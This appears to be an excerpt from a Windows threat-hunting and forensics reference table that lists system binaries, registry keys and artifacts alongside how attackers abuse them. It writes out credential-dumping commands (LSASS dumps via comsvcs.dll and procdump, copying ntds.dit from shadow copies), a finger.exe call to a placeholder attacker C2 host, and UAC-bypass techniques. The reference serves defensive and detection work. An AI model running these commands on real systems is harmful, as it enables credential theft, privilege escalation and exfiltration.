| `c:\windows\system32\comsvcs.dll` | A legitimate COM+ Services library. Attackers heavily abuse its `MiniDump` export via `rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> dump.bin full` to dump `lsass.exe` memory without dropping any third-party tools! |
| `C:\Windows\System32\config` | The protected system directory that houses the core Windows Registry hives (`SAM`, `SECURITY`, `SOFTWARE`, `SYSTEM`). Attackers constantly try to dump files from this folder (via Volume Shadow Copies or `reg save`) to extract local password hashes and LSA secrets. |
| `C:\Windows\System32\config\RegBack` | A folder intended for automated backups of the core registry hives. While disabled by default in modern Windows 10/11, if populated on a server, attackers can steal the `SAM` and `SYSTEM` hives directly from `RegBack` without touching locked live files! |
| `C:\Windows\System32\config\SAM` | The Security Account Manager registry hive, which stores local user account names and NTLM password hashes. Attackers dump `SAM` (alongside `SYSTEM` to get the boot key) to crack local admin passwords or perform Pass-the-Hash attacks. |

| `C:\Windows\System32\config\SOFTWARE` | The `HKLM\SOFTWARE` registry hive, storing system-wide software configurations, installed programs, and `Run` persistence keys. Crucial for forensic timelines and finding malware persistence. |
| `C:\Windows\System32\config\SYSTEM` | The `HKLM\SYSTEM` registry hive, storing Windows services, drivers, network settings, USB history, and the boot key needed to decrypt the `SAM` hive. |
| `C:\Windows\System32\config\systemprofile` | The user profile directory (`AppData`, `Desktop`, etc.) for the built-in `LOCAL SYSTEM` account. When malware runs as `SYSTEM` (via a service or scheduled task), any files it downloads or drops into "user" folders often land right here. |

| `C:\Windows\System32\consent.exe` | The User Account Control (UAC) consent UI prompt (`consent.exe`) that dims the screen and asks "Do you want to allow this app to make changes?". If an attacker triggers a UAC prompt, `consent.exe` spawns. |

| `C:\Windows\System32\curl.exe` | A built-in command-line tool (included natively since Windows 10) for transferring data over HTTP/HTTPS/FTP. Attackers love using `curl.exe` to download second-stage payloads or exfiltrate stolen data because it is native and doesn't trigger PowerShell logs. |

| `c:\windows\system32\diantz.exe` | An alias/copy of `makecab.exe` used to compress files into Microsoft Cabinet (`.cab`) archives. Attackers use `diantz.exe` to compress stolen documents before exfiltrating them, or to unpack hidden payloads. |

| `C:\Windows\System32\diskshadow.exe` | A Windows Server command-line tool that exposes Volume Shadow Copy functionality. | `C:\Windows\System32\esentutl.exe` | The Extensible Storage Engine database utility. Attackers heavily abuse `esentutl.exe /y` (its file-copy flag) to copy locked system files like `NTDS.dit`, `SAM`, or browser databases (`WebCacheV01.dat`) while bypassing basic file locks. |
| `c:\windows\system32\eudcedit.exe` | The Private Character Editor for creating custom fonts. It is a known LOLBin capable of executing arbitrary code or hijacking DLLs when invoked with specific arguments. |
| `C:\Windows\System32\eventvwr.exe` | The Windows Event Viewer MMC snap-in. Aside from viewing logs, `eventvwr.exe` is famous for a classic UAC bypass technique (hijacking `HKCU\Software\Classes\mscfile\shell\open\command`) to launch an elevated shell. |
| `C:\Windows\System32\Expand.exe` | A built-in utility to decompress `.cab` files. Attackers use `expand.exe` to unpack compressed malware payloads dropped on disk, or to copy files while bypassing simple file-copy detections. |
| `C:\Windows\System32\extrac32.exe` | Another built-in Cabinet (`.cab`) extraction utility. It is a classic LOLBin because `extrac32.exe` can download files from remote UNC/WebDAV shares and write them into NTFS Alternate Data Streams (ADS) to hide payloads! |
| `C:\Windows\System32\findstr.exe` | Searches for text strings inside files (like `grep` on Linux). Attackers constantly run `findstr /si password *.txt *.xml *.ini` across drives and network shares to hunt for hardcoded credentials. |
| `c:\windows\system32\finger.exe` | A legacy TCP/IP utility that queries remote systems for user information. Attackers have creatively abused `finger.exe user@attacker-c2.com` as a stealthy LOLBin to receive C2 commands or exfiltrate small chunks of data over port 79! |
| `C:\Windows\System32\fltMC.exe` | The Filter Manager Control program used to list, load, and unload minifilter drivers. Attackers with admin rights run `fltmc instances` to see which EDR/AV kernel drivers are active, and `fltmc unload` to blind Sysmon or EDR sensors! |
| `C:\Windows\System32\fodhelper.exe` | The Features On Demand helper binary. Because it auto-elevates without a UAC prompt, `fodhelper.exe` is one of the most popular LOLBins used by malware to bypass UAC by hijacking `ms-settings` registry keys. |

| `C:\Windows\System32\robocopy.exe` | Robust File Copy—a powerful built-in file transfer tool. Attackers love `robocopy` (especially with the `/B` backup-mode flag, which bypasses NTFS file permissions!) to copy massive amounts of sensitive data to staging folders or remote shares. |

| `C:\Windows\System32\runas.exe` | Allows a user to run a program under a different user account (`runas /user:DOMAIN\Admin cmd.exe`). Watch for attackers using `runas /netonly` to inject stolen domain credentials into a process for lateral movement! |
| `C:\Windows\System32\rundll32.exe` | Loads and executes exported functions inside DLLs. A top-tier LOLBin: attackers constantly use `rundll32.exe` to run malicious DLLs, execute JavaScript (`javascript:"\..\mshtml,RunHTMLApplication"`), or dump `lsass.exe` via `comsvcs.dll`. |
| `c:\windows\system32\runexehelper.exe` | A helper binary used by Windows to launch executables in specific contexts. It is a known LOLBin that takes a target executable path as a command-line argument and launches it directly. |
| `C:\Windows\System32\runonce.exe` | Executes commands stored in the `RunOnce` registry keys at startup/logon. Attackers drop entries into `RunOnce` and invoke `runonce.exe /AlternateShellStartup` to trigger persistent payloads on demand. |

| `C:\Windows\System32\setspn.exe` | Manages Service Principal Names (SPNs) in Active Directory. When an attacker runs `setspn -T domain -Q */*`, they are actively enumerating service accounts with SPNs to perform a **Kerberoasting** attack and crack service account passwords! |

| `c:\windows\system32\shell32.dll` | The core Windows Shell library. Frequently abused via `rundll32.exe shell32.dll,Control_RunDLL` or `ShellExec_RunDLL` as a LOLBin to launch `.cpl` malware or arbitrary executables while hiding the true parent process. |
| `c:\windows\system32\shimgvw.dll` | The Windows Picture and Fax Viewer DLL. Attackers invoke `rundll32.exe shimgvw.dll,ImageView_Fullscreen` to launch malicious `.url` files or exploit image parsing flaws. |

| `C:\Windows\System32\spoolsv.exe` | The Windows Print Spooler service, which runs as `SYSTEM`. Because it has been riddled with critical vulnerabilities (like PrintNightmare), if `spoolsv.exe` ever spawns `cmd.exe`, `powershell.exe`, or loads an unknown DLL, treat it as an immediate `SYSTEM`-level compromise! |
| `C:\Windows\System32\sru\SRUDB.dat` | The System Resource Usage Monitor (SRUM) ESE database. A forensic goldmine: it tracks every application executed over the last 30–60 days, along with the user SID and **exact bytes sent/received over the network**—proving both execution and data exfiltration! |
| `c:\windows\system32\stordiag.exe` | The Storage Diagnostic tool. It is a documented LOLBin that attempts to run `powershell.exe` from the current directory or `PATH`, allowing attackers to hijack execution via a malicious binary. |
| `C:\Windows\System32\svchost.exe` | The generic Service Host process that runs DLL-based Windows services. Legitimate `svchost.exe` **always** has `services.exe` as its parent and **always** runs with the `-k` parameter (e.g., `-k netsvcs`); any `svchost.exe` missing `-k` or spawned by `cmd.exe`/`explorer.exe` is fake malware! |
| `C:\Windows\System32\SyncAppvPublishingServer.exe` | A built-in Microsoft App-V utility. It is a well-known LOLBin that accepts PowerShell commands directly on its command line (`SyncAppvPublishingServer.exe "n; Start-Process calc"`) to execute PowerShell without invoking `powershell.exe`! |
| `C:\Windows\System32\SyncAppvPublishingServer.vbs` | The VBScript companion to `SyncAppvPublishingServer.exe`. Attackers invoke it via `wscript.exe` or `cscript.exe` to execute arbitrary PowerShell commands through a signed Microsoft script. |
| `C:\Windows\System32\Sysprep` | Contains the System Preparation (`sysprep.exe`) tool and unattend files used to generalize Windows images. Attackers check here for leftover `unattend.xml` files containing plaintext admin passwords, or abuse `sysprep.exe` for DLL hijacking/UAC bypasses. |
| `c:\windows\system32\syssetup.dll` | The Windows NT System Setup library. Like `setupapi.dll`, attackers call `rundll32.exe syssetup.dll,SetupInfObjectInstallAction` as a LOLBin to execute malicious `.inf` scriptlets. |
| `C:\Windows\System32\systeminfo.exe` | Displays detailed OS version, uptime, domain, network cards, and installed hotfixes (KB patches). Almost every attacker runs `systeminfo` immediately after landing on a box to find missing Windows patches for local privilege escalation! |
| `C:\Windows\System32\takeown.exe` | Allows an administrator to take ownership of a file or folder (`takeown /f ...`). Attackers run `takeown.exe` right before `icacls.exe` to seize control of protected system binaries (like `sethc.exe` or defender files) so they can overwrite or delete them. |
| `C:\Windows\System32\tar.exe` | The native archive utility (included since Windows 10) for creating and extracting `.tar` and `.zip` archives. Threat actors frequently use `tar.exe -a -c -f stolen.zip C:\SensitiveData` to stage and compress files for exfiltration. |

| `C:\Windows\System32\telnet.exe` | The legacy Telnet client (not installed by default). If `telnet.exe` is present or running, attackers may be using it to test open ports on internal servers or connect to cleartext legacy devices. |
| `C:\Windows\System32\termsrv.dll` | The core Remote Desktop Services (Terminal Services) library. Attackers sometimes patch `termsrv.dll` on compromised workstations/servers to allow multiple simultaneous RDP sessions without kicking off the legitimate user! |

| `C:\Windows\System32\ttdinject.exe` | The Time Travel Debugging (TTD) injector utility. It is a documented LOLBin (`ttdinject.exe /ClientScenario ... /Launch evil.exe`) used to proxy the execution of arbitrary binaries under a Microsoft-signed process. |

| `HKLM\SYSTEM\CurrentControlSet\Services` | The master registry location for every Windows service and kernel driver (`ImagePath`, `Start` type, `ObjectName`). Attackers create new subkeys here for `SYSTEM` persistence or modify existing services (`sc config`) to point `ImagePath` to malware! |
| `HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>` | The **Background Activity Moderator (BAM)** registry key! Forensically awesome: it records the **exact full file path and last execution timestamp (in UTC)** of executables run by each user SID—often capturing short-lived attacker tools that didn't generate a Prefetch file! |
| `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>` | Stores the configuration of Active Directory Certificate Services on a CA server, including **`EditFlags`** (where attackers enable `EDITF_ATTRIBUTESUBJECTALTNAME2`—the dangerous **ESC6** vulnerability that lets any user request a certificate impersonating a Domain Admin!). |
| `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters` | Stores configuration parameters for a Windows DNS Server, most notably **`ServerLevelPluginDll`**. Attackers with DNSAdmins rights set `ServerLevelPluginDll` to a malicious DLL path so `dns.exe` loads it as `SYSTEM` on a Domain Controller! |
| `HKLM\SYSTEM\CurrentControlSet\Services\EventLog` | Configures Windows Event Log channels, file paths, and maximum log sizes. Attackers sometimes inspect or alter `MaxSize` values here to force logs to wrap and overwrite older evidence rapidly. |
| `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters` | Controls Netlogon service behavior on workstations and Domain Controllers (such as `RequireSignOrSeal` and `FullSecureChannelProtection`). Tampering here can weaken domain channel security (related to Zerologon-style attacks). |
| `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters` | Stores the file paths (`DSA Database file`, `Database log files path`) for the Active Directory `ntds.dit` database on a Domain Controller. Useful for locating non-default `NTDS` paths during Domain Controller forensics. |
| `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy` | Stores Windows Defender Firewall profile settings (`DomainProfile`, `StandardProfile`, `PublicProfile` -> `EnableFirewall`) and firewall rules. Watching `EnableFirewall` flip from `1` to `0` is a classic indicator of an attacker dropping host defenses. |
| `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders` | Configures Windows Time service DLL providers (`NtpClient`, `NtpServer`). Attackers with `SYSTEM` rights can register a malicious DLL as a custom Time Provider (`DllName`) for stealthy, reboot-persistent execution inside the `W32Time` service! |
| `HKLM\SYSTEM\MountedDevices` | Maps drive letters (`\DosDevices\C:`, `\DosDevices\E:`) and Volume GUIDs to physical disk signatures and USB serial numbers. Used alongside `USBSTOR` and `setupapi.dev.log` to prove which drive letter was assigned to a specific USB thumb drive! |
| `<ESP>\EFI\Microsoft\Boot` | The EFI System Partition (ESP) boot directory containing the Windows Boot Manager (`bootmgfw.efi`). Advanced APTs and bootkits (like BlackLotus) mount the hidden ESP partition to replace `bootmgfw.efi` with a malicious UEFI bootloader that persists even across OS reinstalls! |
| `<no default path>\Bginfo.exe` | A Sysinternals utility that displays system info on the desktop wallpaper. Attackers abuse `Bginfo.exe` as a LOLBin (`Bginfo.exe /popup /nolicprompt evil.bgi`) because `.bgi` configuration files can embed VBScripts that execute under a Microsoft-signed binary! |
| `<no default path>\dnx.exe` | The legacy .NET Execution Environment utility. It is a documented LOLBin (`dnx.exe consoleapp`) that compiles and executes arbitrary C# code from a `project.json` folder, bypassing application allowlisting. |
| `<no default path>\msxsl.exe` | A Microsoft command-line XSL transformation utility. A well-known LOLBin: attackers pass a crafted `.xsl` stylesheet containing embedded JScript or VBScript to `msxsl.exe` to execute fileless malware! |
| `<no default path>\Procdump.exe` | A legitimate Sysinternals utility for capturing process memory dumps. **CRITICAL CREDENTIAL THEFT ALERT**: Attackers constantly bring `procdump.exe` onto endpoints and run `procdump.exe -accepteula -ma lsass.exe lsass.dmp` to dump `lsass.exe` memory using a trusted Microsoft-signed binary! |
| `<no default path>\rcsi.exe` | A standalone .NET Roslyn C# Interactive command-line runner. Like `csi.exe`, attackers drop `rcsi.exe` onto a host to execute C# scripts (`.csx`) directly in memory, bypassing standard `.exe` blocks. |
| `<no default path>\te.exe` | The Test Authoring and Execution Framework (TAEF) test runner from the Windows Driver Kit (WDK). It is a documented LOLBin capable of loading and executing arbitrary malicious DLLs disguised as test modules. |
| `<no default path>\Tracker.exe` | A Microsoft Build Tools utility that tracks file dependencies during builds. It is a known LOLBin (`Tracker.exe /d evil.dll /c notepad.exe`) that injects an arbitrary DLL into a newly spawned process! |
| `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>` | The raw device path used to access Volume Shadow Copies directly without mounting a drive letter. Attackers use `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit` to steal locked Active Directory and `SAM` hives! |
